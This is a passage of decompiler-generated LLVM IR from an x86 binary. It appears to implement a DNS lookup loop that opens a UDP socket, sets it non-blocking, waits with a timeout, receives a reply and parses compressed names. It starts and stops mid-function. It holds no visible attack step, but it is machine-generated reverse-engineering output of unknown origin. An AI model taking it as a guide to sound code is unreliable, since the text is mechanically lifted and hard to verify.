  %v1_804f479 = add i32 %v0_804f479, 1
  %v2_804f479 = inttoptr i32 %v1_804f479 to i16*
  store i16 256, i16* %v2_804f479, align 2
  %v0_804f482 = load i32, i32* @ebx, align 4
  %v1_804f482 = add i32 %v0_804f482, 2
  %v2_804f482 = inttoptr i32 %v1_804f482 to i16*
  store i16 256, i16* %v2_804f482, align 2
  %v0_804f488 = load i32, i32* %ebp.global-to-local, align 4
  %v10_804f488 = icmp eq i32 %v0_804f488, -1
  br i1 %v10_804f488, label %dec_label_pc_804f49c.preheader, label %dec_label_pc_804f490

dec_label_pc_804f490.loopexit:                    ; preds = %dec_label_pc_804f5b5
  %v0_804f493.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804f490

dec_label_pc_804f490:                             ; preds = %dec_label_pc_804f490.loopexit, %dec_label_pc_804f3aa
  %v0_804f493 = phi i32 [ %v0_804f493.pre, %dec_label_pc_804f490.loopexit ], [ %v0_804f488, %dec_label_pc_804f3aa ]
  %v0_804f490 = load i32, i32* @esp, align 4
  %v2_804f493 = add i32 %v0_804f490, -16
  %v3_804f493 = inttoptr i32 %v2_804f493 to i32*
  store i32 %v0_804f493, i32* %v3_804f493, align 4
  %v1_804f494 = call i32 @function_80521f1(i32 1)
  store i32 %v1_804f494, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f49c.preheader

dec_label_pc_804f49c.preheader:                   ; preds = %dec_label_pc_804f490, %dec_label_pc_804f3aa
  br label %dec_label_pc_804f49c

dec_label_pc_804f49c:                             ; preds = %dec_label_pc_804f49c.preheader, %dec_label_pc_804f5b5
  %v0_804f49c = load i32, i32* @ebx, align 4
  %v1_804f49c = load i32, i32* @esp, align 4
  %v2_804f49c = add i32 %v1_804f49c, -4
  %v3_804f49c = inttoptr i32 %v2_804f49c to i32*
  store i32 %v0_804f49c, i32* %v3_804f49c, align 4
  %v1_804f49d = add i32 %v1_804f49c, -8
  %v2_804f49d = inttoptr i32 %v1_804f49d to i32*
  store i32 0, i32* %v2_804f49d, align 4
  %v1_804f49f = add i32 %v1_804f49c, -12
  %v2_804f49f = inttoptr i32 %v1_804f49f to i32*
  store i32 2, i32* %v2_804f49f, align 4
  %v1_804f4a1 = add i32 %v1_804f49c, -16
  %v2_804f4a1 = inttoptr i32 %v1_804f4a1 to i32*
  store i32 2, i32* %v2_804f4a1, align 4
  %v3_804f4a3 = call i32 @function_80529e5(i32 1, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804f4a3, i32* %eax.global-to-local, align 4
  %v0_804f4a8 = load i32, i32* @esp, align 4
  store i32 %v3_804f4a3, i32* @ebp, align 4
  %v10_804f4ad = icmp eq i32 %v3_804f4a3, -1
  br i1 %v10_804f4ad, label %dec_label_pc_804f5d0, label %dec_label_pc_804f4b6

dec_label_pc_804f4b6:                             ; preds = %dec_label_pc_804f49c
  %v0_804f4b6 = load i32, i32* @ecx, align 4
  %v2_804f4b6 = add i32 %v0_804f4a8, 12
  %v3_804f4b6 = inttoptr i32 %v2_804f4b6 to i32*
  store i32 %v0_804f4b6, i32* %v3_804f4b6, align 4
  %v1_804f4b7 = add i32 %v0_804f4a8, 8
  %v2_804f4b7 = inttoptr i32 %v1_804f4b7 to i32*
  store i32 16, i32* %v2_804f4b7, align 4
  %v1_804f4b9 = add i32 %v0_804f4a8, 4272
  store i32 %v1_804f4b9, i32* @edi, align 4
  %v2_804f4c0 = add i32 %v0_804f4a8, 4
  %v3_804f4c0 = inttoptr i32 %v2_804f4c0 to i32*
  store i32 %v1_804f4b9, i32* %v3_804f4c0, align 4
  %v3_804f4c1 = inttoptr i32 %v0_804f4a8 to i32*
  store i32 %v3_804f4a3, i32* %v3_804f4c1, align 4
  %v3_804f4c2 = call i32 @function_805280a(i32 1, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804f4c7 = load i32, i32* @esp, align 4
  %v1_804f4ca = add i32 %v3_804f4c2, 1
  %v8_804f4ca = icmp eq i32 %v1_804f4ca, 0
  store i32 %v1_804f4ca, i32* %eax.global-to-local, align 4
  br i1 %v8_804f4ca, label %dec_label_pc_804f5d0, label %dec_label_pc_804f4d1

dec_label_pc_804f4d1:                             ; preds = %dec_label_pc_804f4b6
  %v1_804f4d1 = add i32 %v0_804f4c7, 12
  %v2_804f4d1 = inttoptr i32 %v1_804f4d1 to i32*
  store i32 16384, i32* %v2_804f4d1, align 4
  %v1_804f4d6 = add i32 %v0_804f4c7, 20
  %v2_804f4d6 = inttoptr i32 %v1_804f4d6 to i32*
  %v3_804f4d6 = load i32, i32* %v2_804f4d6, align 4
  store i32 %v3_804f4d6, i32* %edx.global-to-local, align 4
  %v2_804f4da = add i32 %v0_804f4c7, 8
  %v3_804f4da = inttoptr i32 %v2_804f4da to i32*
  store i32 %v3_804f4d6, i32* %v3_804f4da, align 4
  %v1_804f4db = add i32 %v0_804f4c7, 2096
  store i32 %v1_804f4db, i32* %eax.global-to-local, align 4
  %v2_804f4e2 = add i32 %v0_804f4c7, 4
  %v3_804f4e2 = inttoptr i32 %v2_804f4e2 to i32*
  store i32 %v1_804f4db, i32* %v3_804f4e2, align 4
  %v0_804f4e3 = load i32, i32* @ebp, align 4
  %v3_804f4e3 = inttoptr i32 %v0_804f4c7 to i32*
  store i32 %v0_804f4e3, i32* %v3_804f4e3, align 4
  %v0_804f4e4 = call i32 @function_8052934()
  %v0_804f4e9 = load i32, i32* @esp, align 4
  %v1_804f4ec = add i32 %v0_804f4e4, 1
  %v8_804f4ec = icmp eq i32 %v1_804f4ec, 0
  store i32 %v1_804f4ec, i32* %eax.global-to-local, align 4
  br i1 %v8_804f4ec, label %dec_label_pc_804f5d0, label %dec_label_pc_804f4f3

dec_label_pc_804f4f3:                             ; preds = %dec_label_pc_804f4d1
  %v2_804f4f3 = add i32 %v0_804f4e9, 12
  %v3_804f4f3 = inttoptr i32 %v2_804f4f3 to i32*
  store i32 %v1_804f4ec, i32* %v3_804f4f3, align 4
  %v1_804f4f4 = add i32 %v0_804f4e9, 8
  %v2_804f4f4 = inttoptr i32 %v1_804f4f4 to i32*
  store i32 0, i32* %v2_804f4f4, align 4
  %v0_804f4f6 = load i32, i32* @ebp, align 4
  %v2_804f4f6 = add i32 %v0_804f4e9, 4
  %v3_804f4f6 = inttoptr i32 %v2_804f4f6 to i32*
  store i32 %v0_804f4f6, i32* %v3_804f4f6, align 4
  %v2_804f4f7 = inttoptr i32 %v0_804f4e9 to i32*
  store i32 3, i32* %v2_804f4f7, align 4
  %v3_804f4f9 = call i32 @function_805212d(i32 1, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804f4fe = load i32, i32* @esp, align 4
  %v12_804f501 = or i32 %v3_804f4f9, 2048
  store i32 %v12_804f501, i32* %eax.global-to-local, align 4
  %v2_804f504 = add i32 %v0_804f4fe, 8
  %v3_804f504 = inttoptr i32 %v2_804f504 to i32*
  store i32 %v12_804f501, i32* %v3_804f504, align 4
  %v0_804f505 = load i32, i32* @ebp, align 4
  %v2_804f505 = add i32 %v0_804f4fe, 4
  %v3_804f505 = inttoptr i32 %v2_804f505 to i32*
  store i32 %v0_804f505, i32* %v3_804f505, align 4
  %v2_804f506 = inttoptr i32 %v0_804f4fe to i32*
  store i32 4, i32* %v2_804f506, align 4
  %v3_804f508 = call i32 @function_805212d(i32 1, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804f50d = load i32, i32* @esp, align 4
  %v1_804f50d = add i32 %v0_804f50d, 4144
  store i32 %v1_804f50d, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 32, i32* %ecx.global-to-local, align 4
  %v1_804f51b = inttoptr i32 %v1_804f50d to i8*
  store i32 %v1_804f50d, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_804f51e = call i8* @_memset(i8* %v1_804f51b, i32 0, i32 32)
  %v6_804f51e = ptrtoint i8* %v5_804f51e to i32
  store i32 %v6_804f51e, i32* %ecx.global-to-local, align 4
  %v0_804f520 = load i32, i32* @ebp, align 4
  %v2_804f524 = udiv i32 %v0_804f520, 32
  store i32 %v2_804f524, i32* @esi, align 4
  %v1_804f527 = urem i32 %v0_804f520, 32
  store i32 %v1_804f527, i32* @ebx, align 4
  %v0_804f52a = load i32, i32* @esp, align 4
  %v2_804f52a = mul nuw nsw i32 %v2_804f524, 4
  %v3_804f52a = add nuw nsw i32 %v2_804f52a, 4144
  %v4_804f52a = add i32 %v3_804f52a, %v0_804f52a
  %v5_804f52a = inttoptr i32 %v4_804f52a to i32*
  %v6_804f52a = load i32, i32* %v5_804f52a, align 4
  %v9_804f52a = shl i32 1, %v1_804f527
  %v12_804f52a = or i32 %v6_804f52a, %v9_804f52a
  store i32 %v12_804f52a, i32* %v5_804f52a, align 4
  %v0_804f532 = load i32, i32* @esp, align 4
  %v1_804f532 = add i32 %v0_804f532, 4288
  %v2_804f532 = inttoptr i32 %v1_804f532 to i32*
  store i32 5, i32* %v2_804f532, align 4
  %v0_804f53d = load i32, i32* @esp, align 4
  %v1_804f53d = add i32 %v0_804f53d, 4292
  %v2_804f53d = inttoptr i32 %v1_804f53d to i32*
  store i32 0, i32* %v2_804f53d, align 4
  %v0_804f548 = load i32, i32* @esp, align 4
  %v1_804f548 = inttoptr i32 %v0_804f548 to i32*
  %v1_804f549 = add i32 %v0_804f548, 4288
  store i32 %v1_804f549, i32* %v1_804f548, align 4
  %v0_804f551 = load i32, i32* @ebp, align 4
  %v1_804f551 = add i32 %v0_804f551, 1
  store i32 %v1_804f551, i32* %eax.global-to-local, align 4
  %v1_804f554 = add i32 %v0_804f548, -4
  %v2_804f554 = inttoptr i32 %v1_804f554 to i32*
  store i32 0, i32* %v2_804f554, align 4
  %v1_804f556 = add i32 %v0_804f548, -8
  %v2_804f556 = inttoptr i32 %v1_804f556 to i32*
  store i32 0, i32* %v2_804f556, align 4
  %v0_804f558 = load i32, i32* %edx.global-to-local, align 4
  %v2_804f558 = add i32 %v0_804f548, -12
  %v3_804f558 = inttoptr i32 %v2_804f558 to i32*
  store i32 %v0_804f558, i32* %v3_804f558, align 4
  %v0_804f559 = load i32, i32* %eax.global-to-local, align 4
  %v2_804f559 = add i32 %v0_804f548, -16
  %v3_804f559 = inttoptr i32 %v2_804f559 to i32*
  store i32 %v0_804f559, i32* %v3_804f559, align 4
  %v0_804f55a = call i32 @function_80523f8()
  store i32 %v0_804f55a, i32* %eax.global-to-local, align 4
  %v0_804f55f = load i32, i32* @esp, align 4
  %v1_804f55f = add i32 %v0_804f55f, 32
  %v10_804f562 = icmp eq i32 %v0_804f55a, -1
  br i1 %v10_804f562, label %dec_label_pc_804f5e4, label %dec_label_pc_804f567

dec_label_pc_804f567:                             ; preds = %dec_label_pc_804f4f3
  %v1_804f567 = icmp eq i32 %v0_804f55a, 0
  br i1 %v1_804f567, label %dec_label_pc_804f5ae, label %dec_label_pc_804f56b

dec_label_pc_804f56b:                             ; preds = %dec_label_pc_804f567
  %v1_804f56b = load i32, i32* @esi, align 4
  %v2_804f56b = mul i32 %v1_804f56b, 4
  %v3_804f56b = add i32 %v0_804f55f, 4160
  %v4_804f56b = add i32 %v3_804f56b, %v2_804f56b
  %v5_804f56b = inttoptr i32 %v4_804f56b to i32*
  %v6_804f56b = load i32, i32* %v5_804f56b, align 4
  %v7_804f56b = load i32, i32* @ebx, align 4
  %v8_804f56b = urem i32 %v7_804f56b, 32
  %v9_804f56b = shl i32 1, %v8_804f56b
  %v10_804f56b = and i32 %v9_804f56b, %v6_804f56b
  %v11_804f56b = icmp ne i32 %v10_804f56b, 0
  %v1_804f573 = zext i1 %v11_804f56b to i32
  %v3_804f573 = and i32 %v0_804f55a, -256
  %v4_804f573 = or i32 %v1_804f573, %v3_804f573
  store i32 %v4_804f573, i32* %eax.global-to-local, align 4
  %v4_804f576 = icmp eq i1 %v11_804f56b, false
  br i1 %v4_804f576, label %dec_label_pc_804f5e4, label %dec_label_pc_804f57a

dec_label_pc_804f57a:                             ; preds = %dec_label_pc_804f56b
  %v2_804f57a = add i32 %v0_804f55f, 28
  %v3_804f57a = inttoptr i32 %v2_804f57a to i32*
  store i32 %v4_804f573, i32* %v3_804f57a, align 4
  %v0_804f57b = load i32, i32* %eax.global-to-local, align 4
  %v2_804f57b = add i32 %v0_804f55f, 24
  %v3_804f57b = inttoptr i32 %v2_804f57b to i32*
  store i32 %v0_804f57b, i32* %v3_804f57b, align 4
  %v1_804f57c = add i32 %v0_804f55f, 20
  %v2_804f57c = inttoptr i32 %v1_804f57c to i32*
  store i32 0, i32* %v2_804f57c, align 4
  %v1_804f57e = add i32 %v0_804f55f, 16
  %v2_804f57e = inttoptr i32 %v1_804f57e to i32*
  store i32 0, i32* %v2_804f57e, align 4
  %v1_804f580 = add i32 %v0_804f55f, 12
  %v2_804f580 = inttoptr i32 %v1_804f580 to i32*
  store i32 16384, i32* %v2_804f580, align 4
  %v1_804f585 = add i32 %v0_804f55f, 8
  %v2_804f585 = inttoptr i32 %v1_804f585 to i32*
  store i32 2048, i32* %v2_804f585, align 4
  %v1_804f58a = add i32 %v0_804f55f, 64
  store i32 %v1_804f58a, i32* %eax.global-to-local, align 4
  %v2_804f58e = add i32 %v0_804f55f, 4
  %v3_804f58e = inttoptr i32 %v2_804f58e to i32*
  store i32 %v1_804f58a, i32* %v3_804f58e, align 4
  %v0_804f58f = load i32, i32* @ebp, align 4
  %v3_804f58f = inttoptr i32 %v0_804f55f to i32*
  store i32 %v0_804f58f, i32* %v3_804f58f, align 4
  %v0_804f590 = call i32 @function_80528f1()
  store i32 %v0_804f590, i32* %eax.global-to-local, align 4
  %v0_804f595 = load i32, i32* @esp, align 4
  store i32 %v0_804f590, i32* @ebx, align 4
  %v1_804f59a = add i32 %v0_804f595, 56
  %v2_804f59a = inttoptr i32 %v1_804f59a to i32*
  %v3_804f59a = load i32, i32* %v2_804f59a, align 4
  store i32 %v3_804f59a, i32* %eax.global-to-local, align 4
  %v2_804f59e = add i32 %v0_804f595, 16
  %v3_804f59e = inttoptr i32 %v2_804f59e to i32*
  store i32 %v3_804f59a, i32* %v3_804f59e, align 4
  %v2_804f59f = call i32 @function_8051c50(i8* inttoptr (i32 1 to i8*))
  %v1_804f5a4 = add i32 %v2_804f59f, 17
  store i32 %v1_804f5a4, i32* %eax.global-to-local, align 4
  %v0_804f5a7 = load i32, i32* @esp, align 4
  %v1_804f5a7 = add i32 %v0_804f5a7, 16
  %v0_804f5aa = load i32, i32* @ebx, align 4
  %v7_804f5aa = icmp ult i32 %v0_804f5aa, %v1_804f5a4
  %v1_804f5ac = icmp eq i1 %v7_804f5aa, false
  br i1 %v1_804f5ac, label %dec_label_pc_804f60a, label %dec_label_pc_804f5ae

dec_label_pc_804f5ae:                             ; preds = %dec_label_pc_804f636, %dec_label_pc_804f60a, %dec_label_pc_804f57a, %dec_label_pc_804f567
  %v0_804f5ae = phi i32 [ %v1_804f623, %dec_label_pc_804f636 ], [ %v1_804f623, %dec_label_pc_804f60a ], [ %v1_804f5a7, %dec_label_pc_804f57a ], [ %v1_804f55f, %dec_label_pc_804f567 ]
  %v1_804f5ae = add i32 %v0_804f5ae, 8
  %v2_804f5ae = inttoptr i32 %v1_804f5ae to i32*
  %v3_804f5ae = load i32, i32* %v2_804f5ae, align 4
  %v12_804f5ae = icmp eq i32 %v3_804f5ae, 5
  br i1 %v12_804f5ae, label %dec_label_pc_804f5e4, label %dec_label_pc_804f5b5

dec_label_pc_804f5b5:                             ; preds = %dec_label_pc_804f5d0, %dec_label_pc_804f5ae
  %v3_804f5b5 = phi i32 [ %v3_804f5dd, %dec_label_pc_804f5d0 ], [ %v3_804f5ae, %dec_label_pc_804f5ae ]
  %v1_804f5bd = phi i32 [ %v1_804f5da, %dec_label_pc_804f5d0 ], [ %v0_804f5ae, %dec_label_pc_804f5ae ]
  %v1_804f5b5 = add i32 %v1_804f5bd, 8
  %v2_804f5b5 = inttoptr i32 %v1_804f5b5 to i32*
  %v1_804f5b9 = add i32 %v3_804f5b5, 1
  store i32 %v1_804f5b9, i32* @edi, align 4
  %v0_804f5ba = load i32, i32* @ebp, align 4
  %v10_804f5ba = icmp eq i32 %v0_804f5ba, -1
  store i32 %v1_804f5b9, i32* %v2_804f5b5, align 4
  %v1_804f5c1 = icmp eq i1 %v10_804f5ba, false
  br i1 %v1_804f5c1, label %dec_label_pc_804f490.loopexit, label %dec_label_pc_804f49c

dec_label_pc_804f5d0:                             ; preds = %dec_label_pc_804f4d1, %dec_label_pc_804f4b6, %dec_label_pc_804f49c
  %v0_804f5d0.in = phi i32 [ %v0_804f4e9, %dec_label_pc_804f4d1 ], [ %v0_804f4c7, %dec_label_pc_804f4b6 ], [ %v0_804f4a8, %dec_label_pc_804f49c ]
  %v2_804f5d3 = inttoptr i32 %v0_804f5d0.in to i32*
  store i32 1, i32* %v2_804f5d3, align 4
  %v1_804f5d5 = call i32 @function_8053da0(i32 1)
  store i32 %v1_804f5d5, i32* %eax.global-to-local, align 4
  %v0_804f5da = load i32, i32* @esp, align 4
  %v1_804f5da = add i32 %v0_804f5da, 16
  %v1_804f5dd = add i32 %v0_804f5da, 24
  %v2_804f5dd = inttoptr i32 %v1_804f5dd to i32*
  %v3_804f5dd = load i32, i32* %v2_804f5dd, align 4
  %v12_804f5dd = icmp eq i32 %v3_804f5dd, 5
  %v1_804f5e2 = icmp eq i1 %v12_804f5dd, false
  br i1 %v1_804f5e2, label %dec_label_pc_804f5b5, label %dec_label_pc_804f5e4

dec_label_pc_804f5e4:                             ; preds = %dec_label_pc_804f5d0, %dec_label_pc_804f5ae, %dec_label_pc_804f56b, %dec_label_pc_804f4f3, %dec_label_pc_804f644, %dec_label_pc_804f64d.backedge
  %v0_804f5e4 = phi i32 [ %v0_804f652123, %dec_label_pc_804f644 ], [ %v0_804f652, %dec_label_pc_804f64d.backedge ], [ %v1_804f5da, %dec_label_pc_804f5d0 ], [ %v0_804f5ae, %dec_label_pc_804f5ae ], [ %v1_804f55f, %dec_label_pc_804f56b ], [ %v1_804f55f, %dec_label_pc_804f4f3 ]
  %v0_804f5e7 = load i32, i32* @ebp, align 4
  %v2_804f5e7 = add i32 %v0_804f5e4, -16
  %v3_804f5e7 = inttoptr i32 %v2_804f5e7 to i32*
  store i32 %v0_804f5e7, i32* %v3_804f5e7, align 4
  %v1_804f5e8 = call i32 @function_80521f1(i32 1)
  store i32 %v1_804f5e8, i32* %eax.global-to-local, align 4
  %v0_804f5ed = load i32, i32* @esp, align 4
  %v1_804f5ed = add i32 %v0_804f5ed, 16
  %v1_804f5f0 = inttoptr i32 %v1_804f5ed to i32*
  %v2_804f5f0 = load i32, i32* %v1_804f5f0, align 4
  store i32 %v2_804f5f0, i32* %edx.global-to-local, align 4
  %v1_804f5f3 = inttoptr i32 %v2_804f5f0 to i8*
  %v2_804f5f3 = load i8, i8* %v1_804f5f3, align 1
  %v3_804f5f3 = icmp eq i8 %v2_804f5f3, 0
  br i1 %v3_804f5f3, label %dec_label_pc_804f6f3, label %dec_label_pc_804f5fc

dec_label_pc_804f5fc:                             ; preds = %dec_label_pc_804f5e4
  %v2_804f5fc = load i32, i32* %v1_804f5f0, align 4
  store i32 %v2_804f5fc, i32* %eax.global-to-local, align 4
  %v1_804f5ff = add i32 %v0_804f5ed, 4300
  %v1_804f605 = inttoptr i32 %v1_804f5ff to i32*
  %v2_804f605 = load i32, i32* %v1_804f605, align 4
  store i32 %v2_804f605, i32* @ebx, align 4
  %v3_804f606 = add i32 %v0_804f5ed, 4308
  %v1_804f607 = inttoptr i32 %v3_804f606 to i32*
  %v2_804f607 = load i32, i32* %v1_804f607, align 4
  store i32 %v2_804f607, i32* @edi, align 4
  %v3_804f607 = add i32 %v0_804f5ed, 4312
  %v1_804f608 = inttoptr i32 %v3_804f607 to i32*
  %v2_804f608 = load i32, i32* %v1_804f608, align 4
  store i32 %v2_804f608, i32* @ebp, align 4
  ret i32 %v2_804f5fc

dec_label_pc_804f60a:                             ; preds = %dec_label_pc_804f57a
  %v1_804f60a = add i32 %v0_804f5a7, 60
  store i32 %v1_804f60a, i32* %edx.global-to-local, align 4
  %v2_804f60e = add i32 %v0_804f5a7, 40
  %v3_804f60e = inttoptr i32 %v2_804f60e to i32*
  store i32 %v1_804f60a, i32* %v3_804f60e, align 4
  %v0_804f612 = load i32, i32* @esp, align 4
  %v1_804f615 = add i32 %v0_804f612, 44
  store i32 %v1_804f615, i32* %ecx.global-to-local, align 4
  %v2_804f619 = add i32 %v0_804f612, -16
  %v3_804f619 = inttoptr i32 %v2_804f619 to i32*
  store i32 %v1_804f615, i32* %v3_804f619, align 4
  %v2_804f61a = call i32 @function_8051c50(i8* inttoptr (i32 1 to i8*))
  store i32 %v2_804f61a, i32* %eax.global-to-local, align 4
  %v0_804f61f = load i32, i32* @esp, align 4
  %v2_804f61f = add i32 %v2_804f61a, 65
  %v3_804f61f = add i32 %v2_804f61f, %v0_804f61f
  store i32 %v3_804f61f, i32* %ecx.global-to-local, align 4
  %v1_804f623 = add i32 %v0_804f61f, 16
  %v1_804f626 = add i32 %v0_804f61f, 30
  %v2_804f626 = inttoptr i32 %v1_804f626 to i16*
  %v3_804f626 = load i16, i16* %v2_804f626, align 2
  %v4_804f626 = zext i16 %v3_804f626 to i32
  %v7_804f626 = and i32 %v1_804f50d, -65536
  %v8_804f626 = or i32 %v4_804f626, %v7_804f626
  store i32 %v8_804f626, i32* @edi, align 4
  %v3_804f62b = add i32 %v0_804f61f, 48
  %v4_804f62b = inttoptr i32 %v3_804f62b to i16*
  %v5_804f62b = load i16, i16* %v4_804f62b, align 2
  %v16_804f62b = icmp eq i16 %v3_804f626, %v5_804f62b
  %v1_804f630 = icmp eq i1 %v16_804f62b, false
  br i1 %v1_804f630, label %dec_label_pc_804f5ae, label %dec_label_pc_804f636

dec_label_pc_804f636:                             ; preds = %dec_label_pc_804f60a
  %v1_804f636 = add i32 %v0_804f61f, 54
  %v2_804f636 = inttoptr i32 %v1_804f636 to i16*
  %v3_804f636 = load i16, i16* %v2_804f636, align 2
  %v4_804f636 = zext i16 %v3_804f636 to i32
  %v6_804f636 = and i32 %v2_804f61a, -65536
  %v7_804f636 = or i32 %v4_804f636, %v6_804f636
  store i32 %v7_804f636, i32* %eax.global-to-local, align 4
  %v4_804f63b = icmp eq i16 %v3_804f636, 0
  br i1 %v4_804f63b, label %dec_label_pc_804f5ae, label %dec_label_pc_804f644

dec_label_pc_804f644:                             ; preds = %dec_label_pc_804f636
  %v2_804f644 = call i16 @llvm.bswap.i16(i16 %v3_804f636)
  %v3_804f644 = zext i16 %v2_804f644 to i32
  %v6_804f644 = or i32 %v3_804f644, %v6_804f636
  store i32 %v6_804f644, i32* %eax.global-to-local, align 4
  %v3_804f648 = add i32 %v0_804f61f, 38
  %v4_804f648 = inttoptr i32 %v3_804f648 to i16*
  store i16 %v2_804f644, i16* %v4_804f648, align 2
  %v0_804f64d118 = load i32, i32* @esp, align 4
  %v1_804f64d119 = add i32 %v0_804f64d118, 22
  %v2_804f64d120 = inttoptr i32 %v1_804f64d119 to i16*
  %v3_804f64d121 = load i16, i16* %v2_804f64d120, align 2
  %v4_804f64d122 = add i16 %v3_804f64d121, -1
  store i16 %v4_804f64d122, i16* %v2_804f64d120, align 2
  %v0_804f652123 = load i32, i32* @esp, align 4
  %v1_804f652124 = add i32 %v0_804f652123, 22
  %v2_804f652125 = inttoptr i32 %v1_804f652124 to i16*
  %v3_804f652126 = load i16, i16* %v2_804f652125, align 2
  %v13_804f652127 = icmp eq i16 %v3_804f652126, -1
  br i1 %v13_804f652127, label %dec_label_pc_804f5e4, label %dec_label_pc_804f65a

dec_label_pc_804f65a:                             ; preds = %dec_label_pc_804f644, %dec_label_pc_804f64d.backedge
  %v0_804f652128 = phi i32 [ %v0_804f652, %dec_label_pc_804f64d.backedge ], [ %v0_804f652123, %dec_label_pc_804f644 ]
  %v0_804f65a = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_804f65a, i32* %edx.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_804f66312 = inttoptr i32 %v0_804f65a to i8*
  %v2_804f66313 = load i8, i8* %v1_804f66312, align 1
  %v3_804f66314 = zext i8 %v2_804f66313 to i32
  %v4_804f66315 = load i32, i32* %eax.global-to-local, align 4
  %v5_804f66316 = and i32 %v4_804f66315, -256
  %v6_804f66317 = or i32 %v5_804f66316, %v3_804f66314
  store i32 %v6_804f66317, i32* %eax.global-to-local, align 4
  %v4_804f66518 = icmp eq i8 %v2_804f66313, 0
  br i1 %v4_804f66518, label %dec_label_pc_804f69a, label %dec_label_pc_804f669.preheader.preheader

dec_label_pc_804f669.preheader.preheader:         ; preds = %dec_label_pc_804f65a
  %v1_804f68e = add i32 %v0_804f652128, 32
  br label %dec_label_pc_804f669.preheader

dec_label_pc_804f669.preheader:                   ; preds = %dec_label_pc_804f669.preheader.preheader, %dec_label_pc_804f72c
  %v0_804f730 = phi i32 [ %v3_804f730, %dec_label_pc_804f72c ], [ 1, %dec_label_pc_804f669.preheader.preheader ]
  %v0_804f72d44 = phi i32 [ %v0_804f72d, %dec_label_pc_804f72c ], [ 0, %dec_label_pc_804f669.preheader.preheader ]
  %v0_804f67640 = phi i32 [ %v1_804f72c, %dec_label_pc_804f72c ], [ %v0_804f65a, %dec_label_pc_804f669.preheader.preheader ]
  %v0_804f66938 = phi i32 [ %v6_804f663, %dec_label_pc_804f72c ], [ %v6_804f66317, %dec_label_pc_804f669.preheader.preheader ]
  br label %dec_label_pc_804f669

dec_label_pc_804f669:                             ; preds = %dec_label_pc_804f669.preheader, %dec_label_pc_804f671
  %v0_804f72d = phi i32 [ %v0_804f72d44, %dec_label_pc_804f669.preheader ], [ 1, %dec_label_pc_804f671 ]
  %v0_804f72c = phi i32 [ %v0_804f67640, %dec_label_pc_804f669.preheader ], [ %v2_804f692, %dec_label_pc_804f671 ]
  %v4_804f663 = phi i32 [ %v0_804f66938, %dec_label_pc_804f669.preheader ], [ %v6_804f694, %dec_label_pc_804f671 ]
  %v1_804f669 = trunc i32 %v4_804f663 to i8
  %tmp140 = icmp ult i8 %v1_804f669, -64
  br i1 %tmp140, label %dec_label_pc_804f72c, label %dec_label_pc_804f671

dec_label_pc_804f671:                             ; preds = %dec_label_pc_804f669
  %v1_804f671 = urem i32 %v4_804f663, 256
  store i32 %v1_804f671, i32* %eax.global-to-local, align 4
  %v1_804f676 = add i32 %v0_804f72c, 1
  %v2_804f676 = inttoptr i32 %v1_804f676 to i8*
  %v3_804f676 = load i8, i8* %v2_804f676, align 1
  %v4_804f676 = zext i8 %v3_804f676 to i32
  store i32 1, i32* @ebx, align 4
  %v2_804f684 = mul nuw nsw i32 %v1_804f671, 256
  %v2_804f687 = add nsw i32 %v2_804f684, -49152
  %v3_804f687 = or i32 %v4_804f676, %v2_804f687
  store i32 %v3_804f687, i32* %eax.global-to-local, align 4
  %v2_804f692 = add i32 %v1_804f68e, %v3_804f687
  store i32 %v2_804f692, i32* %edx.global-to-local, align 4
  %v1_804f694 = inttoptr i32 %v2_804f692 to i8*
  %v2_804f694 = load i8, i8* %v1_804f694, align 1
  %v3_804f694 = zext i8 %v2_804f694 to i32
  %v6_804f694 = or i32 %v3_804f694, %v2_804f687
  store i32 %v6_804f694, i32* %eax.global-to-local, align 4
  %v4_804f696 = icmp eq i8 %v2_804f694, 0
  %v1_804f698 = icmp eq i1 %v4_804f696, false
  br i1 %v1_804f698, label %dec_label_pc_804f669, label %dec_label_pc_804f69a

dec_label_pc_804f69a:                             ; preds = %dec_label_pc_804f72c, %dec_label_pc_804f671, %dec_label_pc_804f65a
  %v4_804f6b624 = phi i32 [ %v6_804f66317, %dec_label_pc_804f65a ], [ %v6_804f694, %dec_label_pc_804f671 ], [ %v6_804f663, %dec_label_pc_804f72c ]
  %v5_804f750 = phi i32 [ %v0_804f65a, %dec_label_pc_804f65a ], [ %v2_804f692, %dec_label_pc_804f671 ], [ %v1_804f72c, %dec_label_pc_804f72c ]
  %v1_804f69a = phi i32 [ 0, %dec_label_pc_804f65a ], [ 1, %dec_label_pc_804f671 ], [ %v0_804f72d, %dec_label_pc_804f72c ]
  %v0_804f69a = phi i32 [ 1, %dec_label_pc_804f65a ], [ %v0_804f730, %dec_label_pc_804f671 ], [ %v3_804f730, %dec_label_pc_804f72c ]
  %v2_804f69a = add i32 %v1_804f69a, %v0_804f65a
  %v2_804f69c = add i32 %v2_804f69a, %v0_804f69a
  store i32 %v2_804f69c, i32* @esi, align 4
  %v1_804f69f = inttoptr i32 %v2_804f69c to i16*
  %v2_804f69f = load i16, i16* %v1_804f69f, align 2
  %v8_804f69f = icmp eq i16 %v2_804f69f, 256
  %v1_804f6a4 = add i32 %v2_804f69c, 10
  store i32 %v1_804f6a4, i32* @edi, align 4
  br i1 %v8_804f69f, label %dec_label_pc_804f744, label %dec_label_pc_804f6ad

dec_label_pc_804f6ad:                             ; preds = %dec_label_pc_804f744, %dec_label_pc_804f69a
  store i32 %v1_804f6a4, i32* %edx.global-to-local, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v1_804f6b621 = inttoptr i32 %v1_804f6a4 to i8*
  %v2_804f6b622 = load i8, i8* %v1_804f6b621, align 1
  %v3_804f6b623 = zext i8 %v2_804f6b622 to i32
  %v5_804f6b625 = and i32 %v4_804f6b624, -256
  %v6_804f6b626 = or i32 %v3_804f6b623, %v5_804f6b625
  store i32 %v6_804f6b626, i32* %eax.global-to-local, align 4
  %v4_804f6b827 = icmp eq i8 %v2_804f6b622, 0
